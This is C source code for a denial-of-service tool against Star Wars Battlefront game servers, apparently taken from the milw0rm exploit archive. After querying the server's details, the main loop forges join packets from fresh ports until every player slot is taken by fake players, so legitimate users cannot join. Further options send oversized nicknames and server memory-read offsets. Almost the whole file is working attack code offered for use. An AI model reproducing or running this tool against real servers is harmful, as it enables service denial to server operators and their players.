/*
    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
/*

Show_dump 0.1

    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

function to show the hex dump of a buffer

Usage:

    to show the hex dump on the screen:
        show_dump(buffer, buffer_length, stdout);

    to write the hex dump in a file or other streams:
        show_dump(buffer, buffer_length, fd);

    (if you know C you know what FILE *stream means 8-)
*/



void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
    const char      *hex = "0123456789abcdef";
    unsigned char   buffout[68],
                    *pout,
                    *p1,
                    *p2,
                    i,
                    rest;


    p1 = buff;
    p2 = buff;

    while(buffsz) {

        pout = buffout;
        if(buffsz < 16) rest = buffsz;
            else rest = 16;

        for(i = 0; i < rest; i++, p1++) {
            *pout++ = hex[*p1 >> 4];
            *pout++ = hex[*p1 & 0xf];
            *pout++ = 0x20;
        }

        for(i = pout - buffout; i < 50; i++, pout++) *pout = 0x20;

        for(i = 0; i < rest; i++, p2++, pout++) {
            if(*p2 >= 0x20) *pout = *p2;
                else *pout = 0x2e;
        }

        *pout++ = 0x0a;
        *pout   = 0x00;

        fputs(buffout, stream);
        buffsz -= rest;
    }
}



/*

StarWars Battlefront CRC32 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org


INTRODUCTION
============
This modified CRC32 algorithm is used for some operations like the
password authentication, in fact the password is a checksum comparison.


EXAMPLE
=======
mycrc = swbcrc(password, stlren(password));


LICENSE
=======
    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

*/

unsigned long swbcrc(unsigned char *data, int size) {
    const static unsigned long  crctable[] = {
        0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,
        0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,
        0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,
        0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,
        0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,
        0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,
        0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,
        0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,
        0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,
        0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,
        0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,
        0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,
        0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,
        0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,
        0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,
        0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,
        0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,
        0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,
        0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,
        0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,
        0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,
        0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,
        0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,
        0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,
        0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,
        0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,
        0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,
        0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,
        0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,
        0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,
        0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,
        0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,
        0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,
        0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,
        0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,
        0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,
        0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,
        0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,
        0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,
        0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,
        0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,
        0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,
        0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,
        0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,
        0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,
        0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,
        0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,
        0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,
        0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,
        0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,
        0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,
        0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,
        0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,
        0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,
        0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,
        0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,
        0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,
        0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,
        0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,
        0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,
        0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,
        0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,
        0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,
        0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4 };
    unsigned long   crc = 0xffffffffL;

    while(size--) {
        crc = crctable[*data ^ (crc >> 24)] ^ (crc << 8);
        data++;
    }
    return(~crc);
}



/*

Read/Write bits to buffer 0.1.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org

max 32 bits numbers supported (from 0 to 4294967295).
Probably not the fastest bit packing functions existent, but I like them.

*/



unsigned long read_bits(    // number read
  unsigned long bits,       // how much bits to read
  unsigned char *in,        // buffer from which to read the number
  unsigned long in_bits     // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem,
                    seek = 0,
                    ret  = 0,
                    mask = -1L;

    if(bits > 32) return(0);
    if(bits < 32) mask = (1 << bits) - 1;
    for(;;) {
        seek_bits = in_bits & 7;
        ret |= ((*(in + (in_bits >> 3)) >> seek_bits) & mask) << seek;
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        bits    -= rem;
        in_bits += rem;
        seek    += rem;
        mask    = (1 << bits) - 1;
    }
    return(ret);
}



unsigned long write_bits(   // position where the stored number finishs
  unsigned long data,       // number to store
  unsigned long bits,       // how much bits to occupy
  unsigned char *out,       // buffer on which to store the number
  unsigned long out_bits    // position of the buffer in bits
) {
    unsigned long   seek_bits,
                    rem;

    if(bits > 32) return(out_bits);
    if(bits < 32) data &= ((1 << bits) - 1);
    for(;;) {
        seek_bits = out_bits & 7;
        *(out + (out_bits >> 3)) &= (1 << seek_bits) - 1;   // zero
        *(out + (out_bits >> 3)) |= (data << seek_bits);
        rem = 8 - seek_bits;
        if(rem >= bits) break;
        out_bits += rem;
        bits     -= rem;
        data     >>= rem;
    }
    return(out_bits + bits);
}




#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}



    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.3.1"
#define BUFFSZ      8192
#define PORT        3658
#define TIMEOUT     3
#define NEEDPWD     "\x05\x00\x00\x00\x01\x02\x00\x00\x00"
#define WRONGVER    "\x05\x00\x00\x00\x01\x04\x00\x00\x00"
#define CHR         'a'



void show_info_1_1(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u_long      bits,
                mem_offset = 0;
    int         sd,
                i,
                len,
                pcklen,
                nicklen,
                on         = 1,
                timewait   = ONESEC,
                hexdump    = 0,
                guest      = 0,
                src_nat    = 0,
                dst_nat    = 0,
                info_only  = 0,
                server_ver = 0;   /* 0 = 1.0 and 1.01, 1 = 1.1, and so on */
    u_short     port = PORT;
    u_char      *buff,
                *pck,
                *b,
                *nick      = "",
                *pwd       = "";


    setbuf(stdout, NULL);

    fputs("\n"
        "Star Wars Battlefront Fake Players DoS and Tester "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT   server port (%d)\n"
            "-n NICK   the nick you want to use for your fake player (default is none)\n"
            "-w PASS   the password to use if the server is protected\n"
            "-i        shows server informations and exits. Works perfectly with servers\n"
            "          >= 1.1 but second half of the info are wrong for servers <= 1.01\n"
            "-t SEC    seconds to wait when the server is full, default is 1\n"
            "-v NUM    version number to use for joining a server, by default the number\n"
            "          is automatically scanned finding the exact server version\n"
            "\n"
            "Test options:\n"
            "-x        shows the hex dump of the join-reply packets received\n"
            "-g        enable the guest player, practically with one single packet is\n"
            "          able to fill 2 player positions and one of them is called Guest\n"
            "-s SIZE   uses a nickname constituited by SIZE chars '%c'\n"
            "-m 0xOFF  enable a server's option that lets clients to send a memory location\n"
            "          that will be read by the server (PS2 servers don't support it)\n"
            "-f NUM    another test option that enable the usage of internal IPs (NAT).\n"
            "          Since it is only for testing, all the IP and port used by this tool\n"
            "          are those of the same server. Use -f 1 to enable client's NAT, 2 for\n"
            "          the server or 3 to enable both\n"
            "\n", argv[0], port, CHR);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 'n': nick = argv[++i]; break;
            case 'w': pwd = argv[++i]; break;
            case 'i': info_only = 1; break;
            case 't': {
                timewait = atoi(argv[++i]);
                printf("- time to wait:   %d seconds\n", timewait);
#ifdef WIN32
                timewait *= 1000;
#endif
                } break;
            case 'v': server_ver = atoi(argv[++i]); break;
            case 'x': hexdump = 1; break;
            case 'g': guest = 1; break;
            case 's': {
                nicklen = atoi(argv[++i]);
                nick = malloc(nicklen + 1);
                if(!nick) std_err();
                memset(nick, CHR, nicklen);
                nick[nicklen] = 0x00;
                } break;
            case 'm': {
                i++;
                if(argv[i][1] == 'x') sscanf(argv[i], "0x%lx", &mem_offset);
                    else sscanf(argv[i], "%lu", &mem_offset);
                printf("- memory offset:   0x%08lx\n", mem_offset);
                } break;
            case 'f': {
                switch(atoi(argv[++i])) {
                    case 1: src_nat = 1; break;
                    case 2: dst_nat = 1; break;
                    case 3: src_nat = dst_nat = 1; break;
                    default: {
                        fputs("\nError: NAT options are 1, 2 or 3\n\n", stdout);
                        exit(1);
                        } break;
                }
                } break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

        /* BUILD INFO PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 2;                /* info packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(0,  1, b, 0);
    bits = write_bits(time(NULL), 32, b, bits); // track ID 1 | used to track our
    bits = write_bits(0,  4, b, bits);          // track ID 2 | query in the reply

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END INFO PACKET */

    if(sendto(sd, buff, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, probably the server uses another port\n\n", stdout);
        exit(1);
    }
    if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
      < 0) std_err();
    show_info_1_1(buff);
    close(sd);

    if(info_only) return(0);

        /* BUILD JOIN PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 4;            /* join packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(server_ver, 12, b, 0);
    bits = write_bits(swbcrc(pwd, strlen(pwd)), 32, b, bits);
    bits = write_bits(guest, 1, b, bits);   // if 1, add also a Guest player
    bits = write_bits(1, 2, b, bits);       // don't know

    nicklen = strlen(nick);
    bits = write_bits(nicklen, 8, b, bits);
    for(i = 0; i < nicklen; i++) {
        bits = write_bits(nick[i], 8, b, bits);
    }

    i = bits >> 3;
    if(bits & 7) i++;
    if(i & 3) i += (4 - (i & 3));
    bits = (i + 4) << 3;    /* 4 = there is a 32 bit number between the 2 bits containers */

    bits = write_bits(0, 32, b, bits);      // don't know
    if(mem_offset) {
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(mem_offset, 32, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(1, 1, b, bits);       // don't know
    bits = write_bits(1, 1, b, bits);       // don't know

        /* IP and port in little-endian (I know that on a big-endian CPU this instructions
           don't return the exact IP and port, but is not important for this tool) */

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* source IP */
    bits = write_bits(port, 16, b, bits);                           /* source port */

    if(src_nat) {   /* LAN IP and port of the client */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* dest IP */
    bits = write_bits(port, 16, b, bits);                           /* dest port */

    if(dst_nat) {   /* LAN IP and port of the server */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END JOIN PACKET */

    pck = malloc(pcklen);
    if(!pck) std_err();
    memcpy(pck, buff, pcklen);
    b = pck + 5;

    fputs("- start fake players attack:\n\n", stdout);
    for(;;) {
        for(;;) {
            fputs("  player: ", stdout);

            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd < 0) std_err();

            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
              < 0) std_err();
            peerl.sin_port++;
            if(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl))
              < 0) std_err();

            if(sendto(sd, pck, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            fputc('.', stdout);

            if(timeout(sd) < 0) {
                fputs("\n"
                    "Error: socket timeout, no reply received\n"
                    "\n", stdout);
                exit(1);
            }
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            fputc('.', stdout);
            close(sd);

            if(*buff != 6) {
                if(buff[5] == 1) {
                    break;  // full
                } else if(!memcmp(buff, NEEDPWD, len)) {
                    fputs("\n"
                        "Error: seems the server is password protected, use the -w option and specify\n"
                        "       the correct password\n"
                        "\n", stdout);
                    exit(1);
                } if(!memcmp(buff, WRONGVER, len)) {
                    server_ver = read_bits(12, b, 0);
                    printf(" wrong version (%d), I try to scan the next version\n", server_ver++);
                    write_bits(server_ver, 12, b, 0);
                    continue;
                }

                fputs("\nError: unknown error, check the following dump:\n", stdout);
                show_dump(buff, len, stdout);
                exit(1);
            }

            fputs(" ok\n", stdout);

            if(hexdump) {
                show_dump(buff, len, stdout);
                fputc('\n', stdout);
            }
        }

        fputs(" server full\n", stdout);
        sleep(timewait);
    }

    return(0);
}



    /* STAR WARS BATTLEFRONT 1.1 */
void show_info_1_1(u_char *data) {
    u_long  len,
            bits = 0;

    data += 5;
    read_bits(32, data, bits); bits += 32;      /* track ID 1, the same of our query */
    read_bits(4, data, bits);  bits += 4;       /* track ID 1, the same of our query */
    fputs("\n  Server name:        ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Gametype:           ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Mission:            ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputc('\n', stdout);
    printf("  Dedicated           %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Auto Assign    %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Heroes              %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Damage         %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Password            %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  AI Units            %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Score               %lu to ", read_bits(11, data, bits));             bits += 11;
    printf("%lu\n", read_bits(11, data, bits));                                     bits += 11;
    printf("  Players             %lu\n", read_bits(7, data, bits));                bits += 7;
    len = read_bits(7, data, bits);
    if(!len) {
        fputs("\n"
            " The version of this server is not compatible with the query protocol used by\n"
            " this tool. All the informations until Password should be correct\n"
            "\n", stdout);
        return;
    }
    bits += 7;
    printf("  Max Players         %lu\n", len);
    printf("  ???                 %lu\n", read_bits(3, data, bits));                bits += 3;
    printf("  ???                 %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Min Players         %lu\n", read_bits(7, data, bits));                bits += 7;
    printf("  AI Difficulty       %lu\n", read_bits(2, data, bits));                bits += 2;
    printf("  Show Player Names   %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Spawn Invincibility %lu\n", read_bits(6, data, bits));                bits += 6;
    fputc('\n', stdout);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



// milw0rm.com [2004-11-24]
